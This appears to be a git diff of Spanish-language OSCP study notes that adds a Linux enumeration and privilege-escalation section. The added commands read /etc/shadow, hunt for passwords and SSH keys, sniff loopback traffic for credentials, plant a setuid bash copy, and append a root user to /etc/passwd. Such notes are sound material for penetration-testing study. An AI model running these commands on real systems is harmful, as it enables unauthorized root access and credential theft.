@@ -7,7 +7,11 @@ Apuntes para la certicación OSCP.
 
 <!-- vscode-markdown-toc -->
 * 1. [Comandos](#comandos)
-    * 1.1. [Windows](#windows)
+    * 1.1. [Linux](#linux)
+    * 1.2. [Crunch](#crunch)
+    * 1.3. [Windows](#windows)
+        * 1.3.1. [Habilitar WinRM](#habilitar-winrm)
+        * 1.3.2. [Habilitar RDP](#habilitar-rdp)
 * 2. [Information Gathering](#information-gathering)
     * 2.1. [Fping](#fping)
         * 2.1.1. [Identificación de hosts](#identificación-de-hosts)
@@ -81,7 +85,7 @@ Apuntes para la certicación OSCP.
 * 6. [Passwords Attacks](#passwords-attacks)
 * 7. [Transferencia de Archivos](#transferencia-de-archivos)
     * 7.1. [Windows](#windows-1)
-    * 7.2. [Linux](#linux)
+    * 7.2. [Linux](#linux-1)
 * 8. [Movimiento Lateral](#movimiento-lateral)
     * 8.1. [RDP](#rdp)
         * 8.1.1. [xfreerdp](#xfreerdp-1)
@@ -102,9 +106,11 @@ Apuntes para la certicación OSCP.
     * 9.1. [Windows](#windows-2)
         * 9.1.1. [Enumeración](#enumeración-1)
         * 9.1.2. [Escalación de Privilegios](#escalación-de-privilegios-1)
-    * 9.2. [Linux](#linux-1)
+    * 9.2. [Linux](#linux-2)
+        * 9.2.1. [Enumeración](#enumeración-2)
+        * 9.2.2. [Escalación de Privilegios](#escalación-de-privilegios-2)
 * 10. [Active Directory](#active-directory)
-    * 10.1. [Escalación de privilegios](#escalación-de-privilegios-2)
+    * 10.1. [Escalación de privilegios](#escalación-de-privilegios-3)
         * 10.1.1. [Grupos Privilegiados](#grupos-privilegiados)
     * 10.2. [Kerberos](#kerberos)
     * 10.3. [Explotación](#explotación)
@@ -117,7 +123,7 @@ Apuntes para la certicación OSCP.
     * 11.4. [Bases de datos](#bases-de-datos)
     * 11.5. [Passwords Attacks](#passwords-attacks-1)
     * 11.6. [Wordlists](#wordlists)
-    * 11.7. [Escalación de Privilegios](#escalación-de-privilegios-3)
+    * 11.7. [Escalación de Privilegios](#escalación-de-privilegios-4)
     * 11.8. [Recursos y Blogs](#recursos-y-blogs)
 
 <!-- vscode-markdown-toc-config
@@ -128,15 +134,23 @@ Apuntes para la certicación OSCP.
 
 ##  1. <a name='comandos'></a>Comandos
 
-###  1.1. <a name='windows'></a>Windows
+###  1.1. <a name='linux'></a>Linux
 
-##### Habilitar WinRM
+###  1.2. <a name='crunch'></a>Crunch
+
+```bash
+crunch 6 6 -t Lab%%% > wordlist
+```
+
+###  1.3. <a name='windows'></a>Windows
+
+####  1.3.1. <a name='habilitar-winrm'></a>Habilitar WinRM
 
 ```powershell
 winrm quickconfig
 ```
 
-##### Habilitar RDP
+####  1.3.2. <a name='habilitar-rdp'></a>Habilitar RDP
 
 ```powershell
 reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
@@ -1085,7 +1099,7 @@ sudo ip r add 172.16.1.0/24 dev ligolo
 ###  7.1. <a name='windows-1'></a>Windows
 
 Diferentes utilidades para las operaciones de transferencia de archivos en Windows.
-###  7.2. <a name='linux'></a>Linux
+###  7.2. <a name='linux-1'></a>Linux
 
 Diferentes utilidades para las operaciones de transferencia de archivos en Linux.
 
@@ -2411,11 +2425,126 @@ También podemos utilizar `SeTakeOwnershipPrivilege` para modificar la propiedad
 
     Tras asumir la propiedad, modificamos los permisos para obtener control total. Ahora podemos modificar los valores de la clave para ejecutar código malicioso, iniciar servicios con privilegios de SYSTEM o agregar nuevas entradas de inicio.
 
-###  9.2. <a name='linux-1'></a>Linux
+###  9.2. <a name='linux-2'></a>Linux
+
+####  9.2.1. <a name='enumeración-2'></a>Enumeración
+
+##### Sistema
+
+```bash
+hostname
+hostname -I
+uname -a
+cat /etc/issue
+cat /etc/os-release
+cat /proc/version
+cat /etc/shells
+lscpu
+ps aux
+env
+/usr/sbin/getcap -r / 2>/dev/null
+find \-writable 2>/dev/null | grep "etc"
+find / -writable -type f 2>/dev/null
+find / -writable -type d 2>/dev/null
+find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
+crontab -l
+sudo crontab -l
+ls -lah /etc/cron*
+dpkg -l
+cat /etc/fstab
+mount
+lsblk
+lsmod
+/sbin/modinfo libata
+```
+
+##### Red
+
+```bash
+ip a
+ifconfig
+route
+ip route
+arp -a
+ip neigh
+ss -anp
+netstat -net
+netstat -ano
+cat /etc/iptables/rules.v4
+```
+
+##### Usuarios y Grupos
+
+```bash
+whoami
+id
+env
+cat .bashrc
+cat /etc/passwd
+cat /etc/passwd | grep "sh$"
+cat /etc/passwd | grep "sh$" | awk '{print $1}' FS=":"
+cat /etc/shadow
+cat /etc/group
+sudo -l
+history
+```
+
+##### Tareas Cron
+
+```bash
+cat /var/log/syslog
+```
+
+##### Búsqueda de credenciales
+
+```bash
+locate password | more
+find / -name password 2>/dev/null -exec ls -l {} \; 2> /dev/null
+find . -type f -exec grep -i -I "PASSWORD" {} /dev/null
+grep -rnw '/' -ie "PASSWORD" –color=always 2>/dev/null
+```
+
+##### Servicios
+
+```bash
+watch -n 1 "ps -aux | grep pass"
+sudo tcpdump -i lo -A | grep "pass"
+```
+
+##### Búsqueda de claves SSH
+
+```bash
+find / -name authorized_keys 2>/dev/null
+find / -name id_rsa 2>/dev/null
+```
+
+```bash
+#Con permiso de escritura sobre script en bash
+echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash'> /home/user/overwrite.sh
+```
+
+##### Automatización
+
+- [Linpeas](https://github.com/peass-ng/PEASS-ng/releases/tag/20230108)
+- [LinEnum](https://github.com/rebootuser/LinEnum)
+- [Linux Exploit Suggester](https://github.com/The-Z-Labs/linux-exploit-suggester)
+
+##### Abusando de Permisos inseguros
+
+
+Si por alguna razón podemos escribir en el archivo `/etc/passwd`, generamos el hash correspondiente y agregaremos una línea a `/etc/passwd` usando el formato apropiado:
+
+```bash
+openssl passwd w00t
+echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd
+su root2
+```
+
+####  9.2.2. <a name='escalación-de-privilegios-2'></a>Escalación de Privilegios
 
 ##  10. <a name='active-directory'></a>Active Directory
 
-###  10.1. <a name='escalación-de-privilegios-2'></a>Escalación de privilegios
+###  10.1. <a name='escalación-de-privilegios-3'></a>Escalación de privilegios
 
 ####  10.1.1. <a name='grupos-privilegiados'></a>Grupos Privilegiados
 
@@ -2501,7 +2630,7 @@ Enlaces a las distintas herramientas y recursos.
 | CeWL                          | [https://github.com/digininja/cewl](https://github.com/digininja/cewl)                                             |
 | API Wordlist                  | https://github.com/chrislockard/api_wordlist/blob/master/api_seen_in_wild.txt                                      |
 
-###  11.7. <a name='escalación-de-privilegios-3'></a>Escalación de Privilegios
+###  11.7. <a name='escalación-de-privilegios-4'></a>Escalación de Privilegios
 
 
 | Nombre   | URL                                                      |
